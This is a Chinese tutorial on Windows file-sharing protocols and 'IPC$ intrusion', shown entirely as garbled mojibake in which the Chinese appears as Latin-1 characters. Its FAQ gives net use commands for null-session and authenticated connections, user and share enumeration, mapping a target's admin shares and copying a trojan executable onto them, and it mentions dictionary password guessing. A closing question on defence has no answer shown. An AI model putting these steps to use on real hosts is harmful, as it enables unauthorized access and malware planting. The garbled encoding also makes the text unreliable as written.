Windowsæ–‡ä»¶å…±äº«åè®®-CIFSï¼Œç”±äºWindowså…±äº«æ˜¯åŸºäºNetBiosåè®®ï¼Œæ˜¯åŸºäºEthernetçš„å¹¿æ’­åè®®ï¼Œåœ¨æ²¡æœ‰é€æ˜ç½‘æ¡¥çš„æƒ…å†µä¸‹ï¼ˆå¦‚VPNï¼‰æ˜¯ä¸èƒ½è·¨ç½‘æ®µä½¿ç”¨çš„ã€‚å®ƒä¸»è¦ç”¨äºunixå’Œwindowsç³»ç»Ÿè¿›è¡Œæ–‡ä»¶å’Œæ‰“å°æœºå…±äº«ï¼Œä¹Ÿå¯ä»¥é€šè¿‡sambaå¥—ä»¶ä¸­çš„ç¨‹åºæŒ‚è½½åˆ°æœ¬åœ°ä½¿ç”¨ã€‚SambaæœåŠ¡åŠŸèƒ½å¼ºå¤§ï¼Œè¿™ä¸å…¶é€šä¿¡åŸºäºSMBCIFSåè®®æœ‰å…³ã€‚SMBä¸ä»…æä¾›ç›®å½•å’Œæ‰“å°æœºå…±äº«ï¼Œè¿˜æ”¯æŒè®¤è¯ã€æƒé™è®¾ç½®ã€‚åœ¨æ—©æœŸï¼ŒSMBè¿è¡ŒäºNBTåè®®ï¼ˆNetBIOS over TCPIPï¼‰ä¸Šï¼Œä½¿ç”¨UDPåè®®çš„137ã€138åŠTCPåè®®çš„139ç«¯å£ï¼›åæœŸSMBç»è¿‡å¼€å‘ï¼Œå¯ä»¥ç›´æ¥è¿è¡ŒäºTCPIPåè®®ä¸Šï¼Œæ²¡æœ‰é¢å¤–çš„NBTå±‚ï¼Œä½¿ç”¨TCPåè®®çš„445ç«¯å£ 1-3 NFSåè®®## NFSæ˜¯NetworkFileSystemçš„ç®€å†™,å³ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿã€‚æ˜¯å·²æ•…çš„Sunå…¬å¸åˆ¶å®šçš„ç”¨äºåˆ†å¸ƒå¼è®¿é—®çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒçš„æœ¬è´¨æ˜¯æ–‡ä»¶ç³»ç»Ÿã€‚ä¸»è¦åœ¨Unixç³»åˆ—æ“ä½œç³»ç»Ÿä¸Šä½¿ç”¨ï¼ŒåŸºäºTCPIPåè®®å±‚ï¼Œå¯ä»¥å°†è¿œç¨‹çš„è®¡ç®—æœºç£ç›˜æŒ‚è½½åˆ°æœ¬åœ°ï¼Œåƒæœ¬åœ°ç£ç›˜ä¸€æ ·æ“ä½œã€‚NFSå…è®¸ä¸€ä¸ªç³»ç»Ÿåœ¨ç½‘ç»œä¸Šä¸å®ƒäººå…±äº«ç›®å½•å’Œæ–‡ä»¶ã€‚é€šè¿‡ä½¿ç”¨NFSï¼Œç”¨æˆ·å’Œç¨‹åºå¯ä»¥è±¡è®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·è®¿é—®è¿œç«¯ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚ 1-4 FTPåè®®## FTPï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§å¤šé€šé“åè®®ï¼Œæ„ä¸ºFTPåè®®æœ‰å¤šä¸ªç«¯å£ä¸å¤–ç•Œè¿›è¡Œé€šä¿¡ï¼Œå·¥ä½œæ¨¡å¼æœ‰â€œFTPæœåŠ¡å™¨å’ŒFTPå®¢æˆ·ç«¯â€ã€‚é»˜è®¤ä½¿ç”¨TCPç«¯å£çš„20å’Œ21ç«¯å£ï¼Œ20ç«¯å£ç”¨äºæ•°æ®ä¼ è¾“ï¼Œ21ç«¯å£ç”¨äºæ§åˆ¶è¿æ¥ã€‚ä¸»è¦ä½œç”¨æ˜¯ä¸ºäº†ç”¨æˆ·ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ ä¸Šé¢ä¸‰è€…çš„åŒºåˆ«ï¼š SambaåŸºäºSAMåè®® WindowsLinux æ–‡ä»¶å…±äº«ï¼ˆç½‘ä¸Šé‚»å±…ï¼‰ Tcp445,tcp139 FTP WindowslinuxunixmacOSç­‰ å‘å¸ƒç½‘ç«™ï¼Œæ–‡ä»¶å…±äº« Tcp21 NFS Linuxunix ç½‘ç«™å‘å¸ƒï¼Œæ–‡ä»¶å…±äº«ï¼ˆmountï¼‰ Tcp2049 ä¸‹é¢è¿™ä¸¤ä¸ªä¸åº”è¯¥å«åšåè®®ï¼Œè€Œæ˜¯ä¸€ç§ç³»ç»Ÿè‡ªå¸¦çš„ã€ç”¨äºå»ºç«‹å…±äº«èµ„æºè¿æ¥çš„åŠŸèƒ½ã€‚ 1-5 IPCè¿æ¥IPC(Internet Process Connection)æ˜¯å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™,åœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚æƒ³å»ºç«‹ipcè¿æ¥ï¼Œéœ€è¦å¯¹æ–¹å¼€å¯äº†ipcè¿æ¥æœåŠ¡ï¼Œä¸€èˆ¬é»˜è®¤æ˜¯å¼€å¯çš„ã€‚ åˆ©ç”¨IPC$ï¼Œè¿æ¥è€…å¯ä»¥ä¸ç›®æ ‡ä¸»æœºå»ºç«‹ä¸€ä¸ªè¿æ¥ï¼Œåˆ©ç”¨è¿™ä¸ªè¿æ¥ï¼Œè¿æ¥è€…å¯ä»¥å¾—åˆ°ç›®æ ‡ä¸»æœºä¸Šçš„ç›®å½•ç»“æ„ã€ç”¨æˆ·åˆ—è¡¨ç­‰ä¿¡æ¯ã€‚ ## 139,445ç«¯å£å¼€å¯ï¼šipc$è¿æ¥å¯ä»¥å®ç°è¿œç¨‹ç™»é™†åŠå¯¹é»˜è®¤å…±äº«çš„è®¿é—®;è€Œ139ç«¯å£çš„å¼€å¯è¡¨ç¤ºnetbiosåè®®çš„åº”ç”¨,æˆ‘ä»¬å¯ä»¥é€šè¿‡139,445(win2000)ç«¯å£å®ç°å¯¹å…±äº«æ–‡ä»¶æ‰“å°æœºçš„è®¿é—®ã€‚ ## ç®¡ç†å‘˜å¼€å¯äº†é»˜è®¤å…±äº«ï¼šé»˜è®¤å…±äº«æ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†å‘˜è¿œç¨‹ç®¡ç†è€Œé»˜è®¤å¼€å¯çš„å…±äº«,å³æ‰€æœ‰çš„é€»è¾‘ç›˜å’Œç³»ç»Ÿç›®å½•ï¼Œæˆ‘ä»¬é€šè¿‡ipc$è¿æ¥å¯ä»¥å®ç°å¯¹è¿™äº›é»˜è®¤å…±äº«çš„è®¿é—®ã€‚åœ¨é»‘å®¢ä¼—å¤šçš„å…¥ä¾µæ‰‹æ®µä¸­ï¼Œé€šè¿‡IPC$å…¥ä¾µæˆä¸ºç›®å‰æ¯”è¾ƒå¸¸è§çš„ä¸€ç§æ–¹å¼ï¼Œå…¶æ”»å‡»æ­¥éª¤ç”šè‡³å¯ä»¥è¯´å·²ç»æˆä¸ºç»å…¸çš„å…¥ä¾µæ¨¡å¼ï¼Œè®¸å¤šæœ‹å‹éå¸¸æƒ³ææ¸…æ¥šè¿™æ˜¯æ€ä¹ˆå›äº‹ã€‚çŸ¥å·±çŸ¥å½¼ï¼Œæ–¹èƒ½ç™¾æˆ˜ä¸æ®†ï¼ŒåŸºäºè¿™ç§è€ƒè™‘ï¼Œæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹è¿™ç§å…¥ä¾µæ–¹å¼çš„åŸºç¡€çŸ¥è¯†ã€‚ ## IPCæ˜¯Internet Process Connectionçš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹ç½‘ç»œè¿æ¥ã€‚å®ƒæ˜¯Windows NT2000XPç‰¹æœ‰çš„ä¸€é¡¹åŠŸèƒ½ï¼Œå°±æ˜¯åœ¨ä¸¤ä¸ªè®¡ç®—æœºè¿›ç¨‹ä¹‹é—´å»ºç«‹é€šä¿¡è¿æ¥ã€‚ä¸€äº›ç½‘ç»œé€šä¿¡ç¨‹åºä¹‹é—´é€šä¿¡å¯ä»¥å»ºç«‹åœ¨IPCä¸Šé¢ã€‚æ‰“ä¸ªæ¯”æ–¹ï¼ŒIPCè¿æ¥å°±åƒæ˜¯æŒ–å¥½çš„åœ°é“ï¼Œç¨‹åºå¯é€šè¿‡åœ°é“è®¿é—®è¿œç¨‹ä¸»æœºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒIPCæ˜¯å…±äº«çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¾®è½¯å·²ç»ä¸ºæˆ‘ä»¬æŒ–å¥½äº†è¿™ä¸ªåœ°é“ï¼ˆIPCï¼‰ï¼Œå› æ­¤ï¼Œè¿™ç§åŸºäºIPCçš„å…¥ä¾µä¹Ÿå¸¸å¸¸è¢«ç®€ç§°ä¸ºIPCå…¥ä¾µã€‚IPCåé¢çš„$æ˜¯å…±äº«çš„æ„æ€ï¼Œä¸è¿‡æ˜¯éšè—çš„å…±äº«ï¼Œå¾®è½¯ç³»ç»Ÿä¸­ç”¨â€œ$â€è¡¨ç¤ºéšè—çš„å…±äº«ï¼Œæ¯”å¦‚C$å°±æ˜¯éšè—çš„å…±äº«Cç›˜ã€‚ä¹Ÿå°±æ˜¯è¯´Cç›˜æ˜¯å…±äº«çš„ï¼Œä½†æ˜¯Cç›˜æ²¡æœ‰é‚£ä¸ªâ€œæ‰˜æ‰‹â€æ ‡å¿—ã€‚IPC$æ˜¯å…±äº«â€œå‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™ï¼Œåœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚åˆ©ç”¨IPC$ï¼Œè¿æ¥è€…ç”šè‡³å¯ä»¥ä¸ç›®æ ‡ä¸»æœºå»ºç«‹ä¸€ä¸ªç©ºçš„è¿æ¥è€Œæ— éœ€ç”¨æˆ·åä¸å¯†ç ï¼å½“ç„¶å¯¹æ–¹æœºå™¨å¿…é¡»æ‰“å¼€IPC$å…±äº«ï¼Œå¦åˆ™ä½ æ˜¯è¿æ¥ä¸ä¸Šçš„ã€‚è€Œåˆ©ç”¨è¿™ä¸ªç©ºçš„è¿æ¥ï¼Œè¿æ¥è€…è¿˜å¯ä»¥å¾—åˆ°ç›®æ ‡ä¸»æœºä¸Šçš„ç”¨æˆ·åˆ—è¡¨ã€‚ ## é—®ï¼šå»ºç«‹IPCè¿æ¥éœ€è¦ä»€ä¹ˆæ¡ä»¶ï¼Ÿ ç­”ï¼šå»ºç«‹IPCè¿æ¥è¦æ±‚åŒæ–¹éƒ½æ˜¯åŸºäºNTæ¶æ„çš„ç³»ç»Ÿã€‚Windows Me9895éƒ½ä¸å¯ä»¥ã€‚ ## é—®ï¼šæ€ä¹ˆæ‰èƒ½å»ºç«‹IPCè¿æ¥å‘¢ï¼Ÿéœ€è¦ä»€ä¹ˆé»‘å®¢å·¥å…·å‘¢ï¼Ÿ ç­”ï¼šå»ºç«‹IPCè¿æ¥ä¸éœ€è¦ä»»ä½•é»‘å®¢å·¥å…·ï¼Œåœ¨Windowsé‡Œæ•²å‘½ä»¤è¡Œå°±è¡Œäº†ï¼Œä½†éœ€è¦çŸ¥é“è¿œç¨‹ä¸»æœºçš„ç”¨æˆ·åå’Œå¯†ç ã€‚æ‰“å¼€CMDåç”¨å¦‚ä¸‹å‘½ä»¤ï¼šnet use\\ip\\ipc$ â€œpasswordâ€ user:â€usernameâ€è¿›è¡Œè¿æ¥ã€‚æ³¨æ„ï¼Œå¦‚æœè¿œç¨‹æœåŠ¡å™¨æ²¡æœ‰ç›‘å¬139æˆ–445ç«¯å£ï¼Œä¼šè¯æ˜¯æ— æ³•å»ºç«‹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´IPC$éœ€è¦å¯¹æ–¹å¼€å¯139æˆ–445ç«¯å£ã€‚ ## é—®ï¼šå»ºç«‹IPC$ä¹‹åé»‘å®¢èƒ½åšä»€ä¹ˆï¼Ÿ ç­”ï¼šå¦‚æœé»‘å®¢ä½¿ç”¨ç®¡ç†å‘˜æƒé™çš„è´¦å·å’Œç›®æ ‡è¿æ¥IPC$ï¼Œä»–å°±å¯ä»¥å’Œå¯¹æ–¹ç³»ç»Ÿåšæ·±å…¥â€œäº¤æµâ€äº†ã€‚é»‘å®¢å¯ä»¥ä½¿ç”¨å„ç§å‘½ä»¤è¡Œæ–¹å¼çš„å·¥å…·ï¼Œæ¯”å¦‚pstoolsç³»åˆ—ã€Win2000SrvReskitã€telnethackç­‰è·å¾—ç›®æ ‡ä¿¡æ¯ã€ç®¡ç†ç›®æ ‡çš„è¿›ç¨‹å’ŒæœåŠ¡ç­‰ã€‚å¦‚æœç›®æ ‡å¼€æ”¾äº†é»˜è®¤å…±äº«ï¼ˆæ²¡å¼€çš„è¯ï¼Œé»‘å®¢ä¼šå¸®ä½ å¼€ï¼‰ï¼Œé»‘å®¢å°±å¯ä»¥ä¸Šä¼ æœ¨é©¬å¹¶è¿è¡Œï¼Œä¹Ÿå¯ä»¥ç”¨tftpã€ftpçš„åŠæ³•ä¸Šä¼ ï¼Œè€Œdwrccã€VNCã€RemoteAdminç­‰å·¥å…·ï¼ˆæœ¨é©¬ï¼‰è¿˜å…·æœ‰ç›´æ¥æ§å±çš„åŠŸèƒ½ï¼Œç›´æ¥æ§åˆ¶æˆ‘ä»¬ã€‚å¦‚æœæ˜¯Win2000 serverï¼Œé»‘å®¢è¿˜ä¼šè€ƒè™‘å¼€å¯ç»ˆç«¯æœåŠ¡ä»¥æ–¹ä¾¿æ§åˆ¶ã€‚ ## é—®ï¼šåˆ«äººæ— æ³•å’Œè‡ªå·±å»ºç«‹IPC$æ˜¯å¦æ„å‘³ç€æˆ‘å°±ä¸èƒ½å’Œå¯¹æ–¹å»ºç«‹IPC$å‘¢ï¼Ÿ ç­”ï¼šä¸æ˜¯çš„ï¼å‘èµ·IPC$å’Œè¢«å»ºç«‹IPC$æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µã€‚åˆ«äººæ— æ³•å’Œè‡ªå·±å»ºç«‹IPC$å¹¶ä¸å½±å“è‡ªå·±æ˜¯å¦èƒ½å¤Ÿå’Œä»–äººå»ºç«‹IPC$ã€‚ ## é—®ï¼šæˆ‘å¬è¯´æœ‰ä¸ªç©ºè¿æ¥ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ ç­”ï¼šç®€å•è¯´æ¥ï¼Œç©ºè¿æ¥å³ä¸éœ€è¦ç”¨æˆ·åå’Œå¯†ç å°±å¯ä»¥å»ºç«‹IPCè¿æ¥ï¼Œä½†æ˜¯è¿™ç§è¿æ¥æ˜¯å¾—ä¸åˆ°ä»€ä¹ˆæƒé™çš„ã€‚å»ºç«‹ç©ºè¿æ¥çš„å‘½ä»¤ï¼šnet use \\IP\\ipc$ â€œâ€ user:â€â€ã€‚ç©ºè¿æ¥æ˜¯åœ¨æ²¡æœ‰ä¿¡ä»»çš„æƒ…å†µä¸‹ä¸æœåŠ¡å™¨å»ºç«‹çš„ä¼šè¯ï¼ˆå³æœªæä¾›ç”¨æˆ·åä¸å¯†ç ï¼‰ï¼Œä½†æ ¹æ®Win2000çš„è®¿é—®æ§åˆ¶æ¨¡å‹ï¼Œç©ºä¼šè¯çš„å»ºç«‹åŒæ ·éœ€è¦æä¾›ä¸€ä¸ªä»¤ç‰Œï¼Œå¯æ˜¯ç©ºä¼šè¯åœ¨å»ºç«‹è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ç»è¿‡ç”¨æˆ·ä¿¡æ¯çš„è®¤è¯ï¼Œæ‰€ä»¥è¿™ä¸ªä»¤ç‰Œä¸­ä¸åŒ…å«ç”¨æˆ·ä¿¡æ¯ï¼Œå› æ­¤ï¼Œè¿™ä¸ªä¼šè¯æ— æ³•åœ¨ç³»ç»Ÿé—´å‘é€åŠ å¯†ä¿¡æ¯ï¼Œä½†è¿™å¹¶ä¸è¡¨ç¤ºç©ºä¼šè¯çš„ä»¤ç‰Œä¸­ä¸åŒ…å«å®‰å…¨æ ‡è¯†ç¬¦SIDï¼ˆå®ƒæ ‡è¯†äº†ç”¨æˆ·å’Œæ‰€å±ç»„ï¼‰ï¼Œå¯¹äºä¸€ä¸ªç©ºä¼šè¯ï¼ŒLSAæä¾›çš„ä»¤ç‰Œçš„SIDæ˜¯S-1-5-7ï¼Œè¿™å°±æ˜¯ç©ºä¼šè¯çš„SIDï¼Œç”¨æˆ·åæ˜¯ï¼šANONYMOUS LOGONï¼ˆè¿™ä¸ªç”¨æˆ·åæ˜¯å¯ä»¥åœ¨ç”¨æˆ·åˆ—è¡¨ä¸­çœ‹åˆ°çš„ï¼Œä½†æ˜¯æ— æ³•åœ¨SAMæ•°æ®åº“ä¸­æ‰¾åˆ°ï¼Œå±äºç³»ç»Ÿå†…ç½®çš„è´¦å·ï¼‰ï¼Œè¿™ä¸ªè®¿é—®ä»¤ç‰ŒåŒ…å«ä¸‹é¢ä¼ªè£…çš„ç»„ï¼šEveryoneï¼ŒNetworkï¼›åœ¨å®‰å…¨ç­–ç•¥çš„é™åˆ¶ä¸‹ï¼Œè¿™ä¸ªç©ºä¼šè¯å°†è¢«æˆæƒè®¿é—®åˆ°ä¸Šé¢ä¸¤ä¸ªç»„æœ‰æƒè®¿é—®åˆ°çš„ä¸€åˆ‡ä¿¡æ¯ã€‚ ## é—®ï¼šç©ºè¿æ¥æœ‰ä»€ä¹ˆç”¨ï¼Ÿ ç­”ï¼šå¯¹äºNTï¼Œåœ¨é»˜è®¤å®‰å…¨è®¾ç½®ä¸‹ï¼Œå€ŸåŠ©ç©ºè¿æ¥å¯ä»¥åˆ—ä¸¾ç›®æ ‡ä¸»æœºä¸Šçš„ç”¨æˆ·å’Œå…±äº«ï¼Œè®¿é—®Everyoneæƒé™çš„å…±äº«ï¼Œè®¿é—®å°éƒ¨åˆ†æ³¨å†Œè¡¨ç­‰ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„åˆ©ç”¨ä»·å€¼ï¼›å¯¹Win2000ä½œç”¨æ›´å°ï¼Œå› ä¸ºåœ¨Win2000å’Œä»¥åç‰ˆæœ¬ä¸­é»˜è®¤åªæœ‰ç®¡ç†å‘˜å’Œå¤‡ä»½æ“ä½œå‘˜æœ‰æƒä»ç½‘ç»œè®¿é—®åˆ°æ³¨å†Œè¡¨ï¼Œè€Œä¸”å®ç°èµ·æ¥ä¹Ÿä¸æ–¹ä¾¿ï¼Œéœ€å€ŸåŠ©å·¥å…·ã€‚ä»è¿™äº›æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§éä¿¡ä»»ä¼šè¯å¹¶æ²¡æœ‰å¤šå¤§çš„ç”¨å¤„ï¼Œä½†ä»ä¸€æ¬¡å®Œæ•´çš„IPC$å…¥ä¾µæ¥çœ‹ï¼Œç©ºè¿æ¥æ˜¯ä¸€ä¸ªä¸å¯ç¼ºå°‘çš„è·³æ¿ï¼Œå› ä¸ºæˆ‘ä»¬ä»å®ƒé‚£é‡Œå¯ä»¥å¾—åˆ°ç”¨æˆ·åˆ—è¡¨ï¼Œç©ºè¿æ¥è¿˜å¯ä»¥åˆ—ä¸¾ç”¨æˆ·å’Œç»„ï¼Œç›®æ ‡ç³»ç»Ÿç±»å‹ç­‰ã€‚è¿™å¯¹äºä¸€ä¸ªè€ç»ƒçš„é»‘å®¢å·²ç»è¶³å¤Ÿäº†ã€‚ ## é—®ï¼šå¦‚ä½•åˆ©ç”¨ç©ºè¿æ¥å¾—åˆ°è¿œç¨‹ä¸»æœºçš„ç”¨æˆ·åˆ—è¡¨ ç­”ï¼šé¦–å…ˆï¼Œå…ˆå»ºç«‹ä¸€ä¸ªç©ºä¼šè¯ï¼ˆéœ€è¦ç›®æ ‡å¼€æ”¾ipc$ï¼‰ï¼Œç”¨å‘½ä»¤ï¼šnet use \\ip\\ipc$ â€œâ€ user:â€â€å³å¯å»ºç«‹ç©ºè¿æ¥ã€‚ç„¶åç”¨å‘½ä»¤ï¼šnet view \\IPå‘½ä»¤æŸ¥çœ‹è¿œç¨‹ä¸»æœºçš„å…±äº«èµ„æºï¼Œå¦‚æœå¯¹æ–¹å¼€äº†å…±äº«ï¼Œå°±å¯ä»¥åˆ—å‡ºå…±äº«åã€ç±»å‹åŠå…¶æ³¨é‡Šã€‚æœ€åå†ä½¿ç”¨nbtstat -A IPå‘½ä»¤å°±å¯ä»¥å¾—åˆ°è¿œç¨‹ä¸»æœºçš„NetBIOSç”¨æˆ·ååˆ—è¡¨ï¼ˆéœ€è¦æ‰“å¼€è‡ªå·±çš„NBTï¼‰ã€‚æ³¨æ„ï¼Œå»ºç«‹IPC$è¿æ¥çš„æ“ä½œä¼šåœ¨EventLogä¸­ç•™ä¸‹è®°å½•ï¼Œä¸ç®¡ä½ æ˜¯å¦ç™»å½•æˆåŠŸã€‚ ## é—®ï¼šç©ºè¿æ¥å’ŒIPC$æ˜¯ä¸€å›äº‹å—ï¼Ÿ ç©ºè¿æ¥å’ŒIPC$æ˜¯ä¸åŒçš„æ¦‚å¿µã€‚ç©ºè¿æ¥æ˜¯åœ¨æ²¡æœ‰ä¿¡ä»»çš„æƒ…å†µä¸‹ä¸æœåŠ¡å™¨å»ºç«‹çš„ä¼šè¯ï¼Œæ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ªåˆ°æœåŠ¡å™¨çš„åŒ¿åè®¿é—®ã€‚IPC$æ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™ã€‚IPC$è¿æ¥å¯ä»¥å®ç°è¿œç¨‹ç™»é™†åŠå¯¹é»˜è®¤å…±äº«çš„è®¿é—®ã€‚ ## é—®ï¼šIPC$æ˜¯ä¸ªæ¼æ´å—ï¼Ÿ è®¸å¤šæ–‡ç« ä¸­éƒ½æåˆ°äº†IPC$æ¼æ´ï¼Œå…¶å®ï¼ŒIPC$å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æ¼æ´ï¼Œå®ƒæ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†å‘˜çš„è¿œç¨‹ç®¡ç†è€Œå¼€æ”¾çš„è¿œç¨‹ç½‘ç»œç™»é™†åŠŸèƒ½ï¼Œè€Œä¸”è¿˜æ‰“å¼€äº†é»˜è®¤å…±äº«ï¼Œå³æ‰€æœ‰çš„é€»è¾‘ç›˜(c$,d$,e$â€¦â€¦)å’Œç³»ç»Ÿç›®å½•winntæˆ–windows(admin$)ã€‚æ‰€æœ‰çš„è¿™äº›ï¼Œå…¶åˆè¡·éƒ½æ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†å‘˜çš„ç®¡ç†ï¼Œä½†ä¸€äº›åˆ«æœ‰ç”¨å¿ƒè€…ä¼šåˆ©ç”¨IPC$è®¿é—®å…±äº«èµ„æºï¼Œå¯¼å‡ºç”¨æˆ·åˆ—è¡¨ï¼Œå¹¶ä½¿ç”¨å­—å…¸å·¥å…·è¿›è¡Œå¯†ç æ¢æµ‹ï¼Œå¯„å¸Œæœ›äºè·å¾—æ›´é«˜çš„æƒé™ï¼Œä»è€Œè¾¾åˆ°ä¸å¯å‘Šäººçš„ç›®çš„ã€‚ä»è¿™ä¸ªè§’åº¦æ¥è¯´ï¼ŒIPC$å¸¸å¸¸è¢«é»‘å®¢æ‰€åˆ©ç”¨ã€‚ ## é—®ï¼šIPC$è¿æ¥æˆåŠŸåï¼Œæˆ‘ç”¨net uset kkk addå‘½ä»¤å»ºç«‹äº†ä¸€ä¸ªè´¦æˆ·ï¼Œå´å‘ç°è¿™ä¸ªè´¦æˆ·åœ¨æˆ‘è‡ªå·±çš„æœºå™¨ä¸Šï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿ ç­”ï¼šIPC$å»ºç«‹æˆåŠŸåªèƒ½è¯´æ˜ä½ ä¸è¿œç¨‹ä¸»æœºå»ºç«‹äº†é€šä¿¡éš§é“ï¼Œå¹¶ä¸æ„å‘³ä½ å–å¾—äº†ä¸€ä¸ªshellï¼Œåªæœ‰åœ¨è·å¾—ä¸€ä¸ªshellä¹‹åï¼Œä½ æ‰èƒ½åœ¨è¿œç¨‹å»ºç«‹ä¸€ä¸ªè´¦æˆ·ï¼Œå¦åˆ™ä½ çš„æ“ä½œåªæ˜¯åœ¨æœ¬åœ°è¿›è¡Œã€‚ ## é—®ï¼šæˆ‘å»ºç«‹ipc$è¿æ¥çš„æ—¶å€™è¿”å›å¦‚ä¸‹ä¿¡æ¯ï¼šâ€˜æä¾›çš„å‡­æ®ä¸å·²å­˜åœ¨çš„å‡­æ®é›†å†²çªâ€™ï¼Œæ€ä¹ˆå›äº‹ï¼Ÿ ç­”ï¼šè¿™è¯´æ˜ä½ ä¸ç›®æ ‡ä¸»æœºå»ºç«‹äº†ä¸€ä¸ªä»¥ä¸Šçš„IPC$è¿æ¥ï¼Œè¿™æ˜¯ä¸å…è®¸çš„ï¼ŒæŠŠå…¶ä»–çš„åˆ æ‰å§ã€‚ç”¨å¦‚ä¸‹å‘½ä»¤è®¡é‡ï¼šnet use \\*.*.*.*\\ipc$ delã€‚ ## é—®ï¼šIPC$ä¸é»˜è®¤å…±äº«æœ‰ä»€ä¹ˆè”ç³»ï¼Ÿ ç­”ï¼šé»˜è®¤å…±äº«æ˜¯ä¸ºäº†æ–¹ä¾¿ç®¡ç†å‘˜è¿œç¨‹ç®¡ç†è€Œé»˜è®¤å¼€å¯çš„å…±äº«ï¼Œå³æ‰€æœ‰çš„é€»è¾‘ç›˜(c$,d$,e$â€¦â€¦)å’Œç³»ç»Ÿç›®å½•winntæˆ–windows(admin$)ï¼Œæˆ‘ä»¬é€šè¿‡ipc$è¿æ¥å¯ä»¥å®ç°å¯¹è¿™äº›é»˜è®¤å…±äº«çš„è®¿é—®ï¼Œå‰ææ˜¯å¯¹æ–¹æ²¡æœ‰å…³é—­è¿™äº›é»˜è®¤å…±äº«ã€‚ ## é—®ï¼šåªè¦å¯¹æ–¹å¼€æ”¾äº†139ç«¯å£æˆ–è€…445ç«¯å£å°±å¯ä»¥å»ºç«‹IPC$å—ï¼Ÿ ç­”ï¼šè¿™ç§æƒ³æ³•ä¸ä¸€å®šæ­£ç¡®ï¼139ã€445ç«¯å£å¼€æ”¾äº†æœªå¿…å¯ä»¥å»ºç«‹IPC$ï¼Œä½†IPC$å¯å»ºç«‹åˆ™è¡¨ç¤ºå¯¹æ–¹çš„139ç«¯å£æˆ–445ç«¯å£å¼€æ”¾äº†ã€‚ ## é—®ï¼šæ€æ ·æ˜ å°„å’Œè®¿é—®é»˜è®¤å…±äº«ï¼Ÿ ç­”ï¼šä½¿ç”¨å‘½ä»¤net use z: \\ç›®æ ‡IP\\c$ â€œå¯†ç â€ user:â€ç”¨æˆ·åâ€å‘½ä»¤ï¼Œå°†å¯¹æ–¹çš„cç›˜æ˜ å°„ä¸ºè‡ªå·±çš„zç›˜ï¼Œå…¶ä»–ç›˜ç±»æ¨ã€‚å¦‚æœå·²ç»å’Œç›®æ ‡å»ºç«‹äº†IPC$ï¼Œåˆ™å¯ä»¥ç›´æ¥ç”¨IPåŠ ç›˜ç¬¦åŠ $è®¿é—®ã€‚æ¯”å¦‚æ‰§è¡Œcopy muma.exe\\IP\\d$\\path\\muma.exeå‘½ä»¤ï¼Œæˆ–è€…å†æ˜ å°„ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯æ— éœ€ç”¨æˆ·åå’Œå¯†ç äº†ï¼Œä¾‹å¦‚è¾“å…¥ï¼šnet use y:\\IP\\d$å‘½ä»¤ã€‚ç„¶åå†æ‰§è¡Œcopy muma.exe y:\\path\\muma.exeå³å¯ã€‚å½“è·¯å¾„ä¸­åŒ…å«ç©ºæ ¼æ—¶ï¼Œé¡»ç”¨â€â€å°†è·¯å¾„å…¨å¼•ä½ã€‚ ## é—®ï¼šå¦‚ä½•åˆ é™¤æ˜ å°„å’Œipc$è¿æ¥ï¼Ÿ ç­”ï¼šç”¨å‘½ä»¤net use \\IP\\ipc$ delå¯ä»¥åˆ é™¤å’Œä¸€ä¸ªç›®æ ‡çš„IPC$è¿æ¥ã€‚ç”¨å‘½ä»¤net use z: delåˆ é™¤æ˜ å°„çš„Zç›˜ï¼Œå…¶ä»–ç›˜ç±»æ¨ã€‚è€Œç”¨å‘½ä»¤net use * delå¯ä»¥åˆ é™¤å…¨éƒ¨ï¼Œåœ¨åˆ é™¤æ—¶ä¼šæœ‰æç¤ºè¦æ±‚æŒ‰â€œyâ€é”®ç¡®è®¤ã€‚ é—®ï¼šå¦‚ä½•é˜²èŒƒIPC$å…¥ä¾µï¼Ÿ ## 